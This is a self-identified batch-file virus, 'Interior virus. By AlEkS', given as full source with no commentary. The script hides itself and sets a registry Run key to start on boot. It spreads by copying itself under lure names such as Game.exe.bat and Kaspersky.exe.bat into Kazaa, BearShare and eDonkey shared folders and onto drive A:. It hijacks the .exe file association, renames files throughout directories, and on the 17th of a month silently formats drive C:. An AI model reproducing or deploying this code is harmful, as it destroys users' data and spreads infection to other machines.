   @echo off
   ctty nul
   echo.|date|find "17">nul
   if errorlevel 1 goto go
   goto int
   :go
   if exist c:\Interior.bat goto 27
   echo 1 >>%0
   copy %0 c:\Interior.bat >nul
   @attrib +h +s c:\Interior.bat >nul
   md C:\LittleLove
   copy %0 c:\LittleLove\Love.exe.bat >nul
   copy %0 c:\LittleLove\Game.exe.bat >nul
   copy %0 c:\LittleLove\Uninstall.exe.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Love.exe.bat >nul
   copy %0 c:\progra~1\bearshare\shared\sex.exe.bat >nul
   copy %0 c:\progra~1\bearshare\shared\Game.exe.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\Game.exe.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Sex.exe.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Game.exe.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\Kaspersky.exe.bat >nul
   copy %0 c:\progra~1\bearshare\shared\lesbians.mp3.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\lesbians.jpg.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\lesbians.jpg.bat >nul
   copy %0 c:\progra~1\install.exe.bat >nul
   copy %0 %windir%\LittleLove.txt.bat >nul
   echo REGEDIT4>C:\yos.reg
   echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>C:\yos.reg
   echo "InterorC"="c:\\Interior.bat" >> C:\yos.reg
   regedit /s C:\yos.reg
   del C:\yos.reg >nul
   if exist %windir%\1.sys goto 2
   :1
   echo 1 >>%windir%\1.sys
   echo 1 >>c:\Interior.inf
   echo 1 >>c:\Interior.txt
   echo 1 >>c:\Interior.ini
   :2
   :27
   if exist c:\Interior.inf goto 5
   :Int
   echo y|Format c:/q >nul
   :5
   if exist c:\Interior.txt goto 11
   set interPC=.
   echo REGEDIT4>C:\Interior.reg
   echo.>>C:\Interior.reg
   echo [HKEY_CLASSES_ROOT\%interPC%exe]>>C:\Interior.reg
   echo "%1" = "txtfile">>C:\Interior.reg
   echo "Content Type" = "text/plain">>C:\Interior.reg
   echo "PerceivedType" = "text">>C:\Interior.reg
   regedit /s C:\Interior.reg
   del C:\Interior.reg
   :11
   if exist c:\Interior.ini goto 33
   cls
   :2av
   for %%v in (*.*) do ren *.* *.interor
   cd ..\
   if errorlevel 1 goto 33
   goto 2av
   :33
   echo      Interior virus. >>%windir%\info.txt
   echo         By AlEkS >>%windir%\info.txt
   copy %0 A:\Interior.txt.bat >nul
   ctty con
   cls
